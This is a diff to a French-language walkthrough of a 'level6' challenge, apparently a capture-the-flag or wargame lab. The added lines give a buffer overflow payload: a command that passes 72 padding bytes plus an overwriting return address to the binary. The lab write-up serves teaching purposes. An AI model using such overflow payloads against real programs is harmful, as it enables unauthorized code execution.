@@ -43,3 +43,6 @@ Notre shellcode correspond donc à :
 Vue que tu nous avons besoin de passer cela en argument il ne faut pas 
 oublier d'utiliser $() pour executer le code et l'envoyer en argument.
 
+Ce qui nous donne :
+
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
